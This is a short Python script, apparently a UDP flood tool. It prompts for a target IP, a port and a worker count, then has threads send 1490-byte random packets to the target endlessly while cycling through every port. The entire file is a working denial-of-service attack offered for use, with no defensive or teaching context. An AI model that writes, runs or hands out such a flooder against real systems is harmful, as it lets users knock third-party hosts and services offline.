from concurrent.futures import ThreadPoolExecutor
import random
import socket
import time
import sys
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1490)

ip = input("IP Target        : ")
port = int(input("Port             : "))
n = int(input("How many workers : "))

def attack(ip, start_port):
    current_port = start_port
    sent = 0
    tid = threading.get_ident()
    while True:
        try:
            sock.sendto(payload, (ip, current_port))
            sent += 1
            print(f"Sent {sent} packet to {ip} through port:{current_port}")
            current_port += 1
            if current_port > 65534:
                current_port = 1
        except KeyboardInterrupt:
            print(f"\n[!] Thread-{tid} stopped by user")
            sys.exit()
        except Exception:
            pass

def main():
    with ThreadPoolExecutor(max_workers=n) as executor:
        for i in range(n):
            start_port = (port + i * 100) % 65535 or 1
            executor.submit(attack, ip, start_port)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Main: shutting down...")
            sys.exit(0)

if __name__ == "__main__":
    main()
